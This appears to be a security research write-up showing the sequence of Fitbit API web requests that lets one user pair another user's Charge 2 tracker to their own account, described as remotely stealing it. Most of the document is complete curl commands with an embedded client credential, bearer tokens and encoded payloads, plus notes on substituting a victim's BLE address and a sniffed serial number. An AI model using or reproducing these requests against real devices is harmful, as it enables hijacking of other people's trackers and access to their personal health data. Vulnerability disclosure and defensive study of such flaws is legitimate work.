# Web Requests for Fitbit Server Pairing

This how Fitbit (Charge 2 and predecessors) trackers perform server pairing by sending web requests to Fitbit backend. Any Fitbit user can "remotely steal" any Fitbit tracker from other users, pairing it to his account.

## Retrieving the OAUTH2 token

**curl -X POST https://android-api.fitbit.com/oauth2/token?session-data=%7B%22os-name%22%3A%22Android%22%2C%22os-version%22%3A%226.0.1%22%2C%22device-model%22%3A%22SM-G900F%22%2C%22device-manufacturer%22%3A%22samsung%22%2C%22device-name%22%3A%22%22%7D -H "Content-Type: application/x-www-form-urlencoded" -H "Authorization: Basic MjI4VlNSOjQ1MDY4YTc2Mzc0MDRmYzc5OGEyMDhkNmMxZjI5ZTRm" -d "grant_type=password&username=xxxxxxxx@gmail.com&password=xxxxxxxx&scope=activity heartrate location nutrition profile settings sleep social weight mfa_ok"**

Using the Fitbit account credentials, a user can retrieve his OAUTH2 token.

## Retrieving the pairingToken

**curl -X POST https://android-cdn-client.fitbit.com/1/devices/client/tracker/data/validate.json?secret=0356&btleName=Charge%202&btAddress=8A260ECE82E8 -H "Content-Type: text/plain" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJhdWQiOiIyMjhWU1IiLCJzdWIiOiI5RFBIV1QiLCJ4YWkiOiIxNTYyMTMxMTY5OTkiLCJ4dmVyIjoiMCIsImlzcyI6IkZpdGJpdCIsInR5cCI6ImFjY2Vzc190b2tlbiIsInNjb3BlcyI6IndociB3bnV0IHdwcm8gd3NsZSB3d2VpIHdtZmEgd3NvYyB3YWN0IHdzZXQgd2xvYyIsImV4cCI6MTYyMTAyODQyMSwiaWF0IjoxNjIwOTk5NjIxfQ.irCKXglkIPD5nzPudPjAfcZRNmGpvPVjpl0n3_Cb-FM" -H "Device-Data-Encoding: base64" -d "AQQAAAIAaAAAAAq1rOl3Fj6HfnlPH/jO+uyNqEHheq7sRZP1qWpu6WPvHUcgGD5QNLwwzWWXjAcvGRuNKI8dvDKBgT9RAtdci3w3piCl7CELzo+H7WQPZcJSK6WNc/gUR2PvNI2wUe8P6XN91iIGTvgmBSEBxrVYDnUT9N5XtT0V3QzGaoMa7BKKXUvjdKrrNcI/Rt8+THkYeiBv+YnKOIeFbIrwUlkRhMWCW3ytReE0GGPnO4Tfo/6uBSyF9bv8"**

Using secret (whatever 4 digit code), btleName ("Charge 2"), btAddress (victim tracker BLE address) and the OAUTH2 token as parameters, a user can retrieve the pairingToken.

## Retrieving the apptoken

**curl -X POST https://android-cdn-client.fitbit.com/1/devices/client/tracker/data/pair.json?challengeResults=0&maxCommsVersion=1&pairingToken=eyJhbGciOiJIUzI1NiJ9.eyJkd2lkIjoiMEFCNUFDRTk3NzE2IiwiZXhwIjoxNjIxMDAzNjg1LCJ1ZWlkIjoiOURQSFdUIiwiaWF0IjoxNjIxMDAwMDg1fQ.TmaWXYmHz5B3toBa5YvKHv1l2jBW_bfFd_LA0eI6Mfo&challengesRun=0 -H "Content-Type: text/plain" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJhdWQiOiIyMjhWU1IiLCJzdWIiOiI5RFBIV1QiLCJ4YWkiOiIxNTYyMTMxMTY5OTkiLCJ4dmVyIjoiMCIsImlzcyI6IkZpdGJpdCIsInR5cCI6ImFjY2Vzc190b2tlbiIsInNjb3BlcyI6IndociB3bnV0IHdwcm8gd3NsZSB3d2VpIHdtZmEgd3NvYyB3YWN0IHdzZXQgd2xvYyIsImV4cCI6MTYyMTAyODQyMSwiaWF0IjoxNjIwOTk5NjIxfQ.irCKXglkIPD5nzPudPjAfcZRNmGpvPVjpl0n3_Cb-FM" -H "Device-Data-Encoding: base64" -d "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"**

Using the OAUTH2 token and the pairingToken as parameters, a user can pair the Fitbit tracker with his account (but last step is still mandatory).

## Retrieving AuthCredentials

**curl -d "serialNumber=0AB5ACE97716" -X POST https://android-cdn-api.fitbit.com/1/user/-/devices/tracker/generateBtleClientAuthCredentials.json -H "Content-Type: application/x-www-form-urlencoded" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJhdWQiOiIyMjhWU1IiLCJzdWIiOiI5RFBIV1QiLCJ4YWkiOiIxNTYyMTMxMTY5OTkiLCJ4dmVyIjoiMCIsImlzcyI6IkZpdGJpdCIsInR5cCI6ImFjY2Vzc190b2tlbiIsInNjb3BlcyI6IndociB3bnV0IHdwcm8gd3NsZSB3d2VpIHdtZmEgd3NvYyB3YWN0IHdzZXQgd2xvYyIsImV4cCI6MTYyMTAyODQyMSwiaWF0IjoxNjIwOTk5NjIxfQ.irCKXglkIPD5nzPudPjAfcZRNmGpvPVjpl0n3_Cb-FM"**

Using the OAUTH2 token and the serialNumber (value that can be found in BLE packets sent after Authentication, so Remote SB Eavesdropping is a prerequisite) as a parameter, a user can generate the AuthSubkey and the Nonce that will be used for Authentication.
